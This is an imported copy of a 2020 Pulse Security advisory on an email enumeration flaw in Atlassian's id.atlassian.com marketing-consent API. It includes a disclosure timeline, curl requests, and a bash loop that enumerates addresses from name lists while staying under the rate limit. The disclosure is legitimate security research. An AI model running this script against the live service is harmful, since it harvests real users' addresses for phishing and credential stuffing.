---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-11_idatlassiancom-username-enumeration.md
original_filename: 2020-11-11_idatlassiancom-username-enumeration.md
title: id.atlassian.com Username enumeration
category: documents
detected_topics:
- rate-limit
- api-security
- sso
- idor
- xss
- command-injection
tags:
- imported
- documents
- rate-limit
- api-security
- sso
- idor
- xss
- command-injection
language: en
raw_sha256: e1ba669b9198199cacce4cd299af00b3597e266b3848b03d6bae7a95f328e782
text_sha256: e7f6f892526e931c9f2e4348d4deb2581d7295f31a48dd608f65c170ae2bf32c
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# id.atlassian.com Username enumeration

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-11_idatlassiancom-username-enumeration.md
- Source Type: markdown
- Detected Topics: rate-limit, api-security, sso, idor, xss, command-injection
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `e1ba669b9198199cacce4cd299af00b3597e266b3848b03d6bae7a95f328e782`
- Text SHA256: `e7f6f892526e931c9f2e4348d4deb2581d7295f31a48dd608f65c170ae2bf32c`


## Content

---
title: "id.atlassian.com Username enumeration"
page_title: "id.atlassian.com Username Enumeration"
url: "https://pulsesecurity.co.nz/advisories/Atlassian-ID-Username-Enumeration"
final_url: "https://pulsesecurity.co.nz/advisories/Atlassian-ID-Username-Enumeration"
authors: ["Denis Andzakovic"]
programs: ["Atlassian"]
bugs: ["Username enumeration"]
publication_date: "2020-11-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4145
---

# id.atlassian.com Username Enumeration

by Denis Andzakovic

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Nov 11 2020

The authentication platform responsible for authenticating cloud-based Jira, Bitbucket and Confluence users (id.atlassian.com) exposes a username enumeration vulnerability via the `https://id.atlassian.com/rest/marketing-consent/config` API endpoint. Pulse Security has leveraged this vulnerability on multiple engagements to build a list of valid target email addresses for further attacks, such as social engineering and credential stuffing. Atlassian have elected to mitigate this vulnerability by implementing a request rate limit, and as such this vulnerability may continue to be used to enumerate users.

**Date Released:** 11/11/2020  
**Author:** Denis Andzakovic  
**Vendor Website:** <https://www.atlassian.com/>  
**Affected Software:** `id.atlassian.com`

## Details

The `https://id.atlassian.com/rest/marketing-consent/config` endpoint takes an email address as its only parameter. The `implicitConsent` return parameter changes based on whether an email address is registered with Atlassian. A valid email returns `false`, while an invalid email returns `true`.

The following figures show a valid and invalid email, respectively:
  
  
  :~$ curl -H "Content-Type: application/json" https://id.atlassian.com/rest/marketing-consent/config -d "{\"email\":\"[[email protected]](/cdn-cgi/l/email-protection)\"}"
  {"showCheckbox":false,"implicitConsent":false,"locale":"US"}
  
  
  
  :~$ curl -H "Content-Type: application/json" https://id.atlassian.com/rest/marketing-consent/config -d "{\"email\":\"[[email protected]](/cdn-cgi/l/email-protection)\"}"
  {"showCheckbox":false,"implicitConsent":true,"locale":"US"}
  

Using the first 500 entries within the family names list in the SecLists repository and after determining the Atlassian email scheme, Pulse Security enumerated 833 Atlassian email addresses as a proof of concept.

## Rate Limiting Mitigation

Atlassian elected to mitigate this vulnerability by introducing a rate limit, limiting the number of requests that can be issued to the `marketing-consent` API to 100 requests every 60 seconds. This can be determined by observing the response headers:
  
  
  :~$ curl -v -k  -H "Content-Type: application/json" https://id.atlassian.com/rest/marketing-consent/config -d "{\"email\":\"[[email protected]](/cdn-cgi/l/email-protection)\"}"
  ...YOINK..
  < HTTP/2 200 
  < date: Tue, 10 Nov 2020 22:26:12 GMT
  < content-type: application/json; charset=UTF-8
  < content-length: 59
  < server: globaledge-envoy
  < x-ratelimit-limit: 100
  < x-ratelimit-remaining: 98
  < x-ratelimit-reset: 1605047215
  < cache-control: private, no-cache, max-age=0, no-store, must-revalidate
  < pragma: no-cache
  < x-frame-options: SAMEORIGIN
  < x-envoy-upstream-service-time: 232
  < referrer-policy: origin
  < expect-ct: report-uri="https://web-security-reports.services.atlassian.com/expect-ct-report/idproxy", max-age=86400
  < strict-transport-security: max-age=63072000; preload
  < x-content-type-options: nosniff
  < x-xss-protection: 1; mode=block
  < 
  * Connection #0 to host id.atlassian.com left intact
  

The `x-ratelimit-limit`, `x-ratelimit-remaining` and `x-ratelimit-reset` detail the rate limiting specifics.

## Exploiting Rate Limited Enumeration

A good place to start for username enumeration is Daniel Miessler’s <https://github.com/danielmiessler/SecLists>. The following curl one-liner (semi-colons replaced with new-lines for “readabilities” sake) can be used to perform an enumeration of `<firstname>.<lastname>@nonexistdomaoin.local`, ensuring that no more than 100 requests are issued every 60 seconds.
  
  
  COUNT=0
  NOW=$(date +%s)
  while read lastname
  do
  while read firstname 
  do
  JSONREQ="{\"email\":\"[[email protected]](/cdn-cgi/l/email-protection)\"}"
  COUNT=$(($COUNT+1))
  echo $JSONREQ
  curl -k  -H "Content-Type: application/json" https://id.atlassian.com/rest/marketing-consent/config -d $JSONREQ; echo
  if [ $COUNT -gt 99 ] && [ $NOW -gt $(($(date +%s)-60)) ]
  then
  DELAY=$(($NOW+60-$(date +%s)))
  echo "[+] sleeping " $DELAY
  sleep $DELAY
  COUNT=0
  NOW=$(date +%s)
  fi
  done < firstnames.txt
  done < familynames-usa-top1000.txt  | tee log
  

With the first-names and last-names provided in SecLists, this should take roughly 13 days to complete from one source IP address. `firstnames.txt` can be created as follows:
  
  
  :~/tools/SecLists/Usernames/Names$ cat malenames-usa-top1000.txt femalenames-usa-top1000.txt | sort -u > firstnames.txt
  

## Timeline

07/09/2020 - Advisory sent to Atlassian.  
10/09/2020 - Atlassian confirm the issue, advisory accepted.  
12/10/2020 - Request for update.  
09/11/2020 - Request for update.  
09/11/2020 - Atlassian advise the issue is closed and the endpoint is now subject to a rate limit.  
11/11/2020 - Advisory released.

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
